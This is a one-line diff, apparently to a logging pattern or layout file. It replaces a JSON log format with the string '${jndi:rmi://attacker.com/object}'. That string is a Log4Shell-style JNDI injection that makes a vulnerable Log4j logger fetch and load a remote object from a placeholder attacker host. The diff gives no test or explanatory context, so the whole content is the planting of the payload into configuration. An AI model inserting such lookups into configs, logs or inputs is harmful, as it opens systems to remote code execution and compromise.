@@ -1,1 +1,1 @@
-{"message": "%m", "level": "%p", "nested": {"field1": "%d", "field2": "%t"}}
+${jndi:rmi://attacker.com/object}
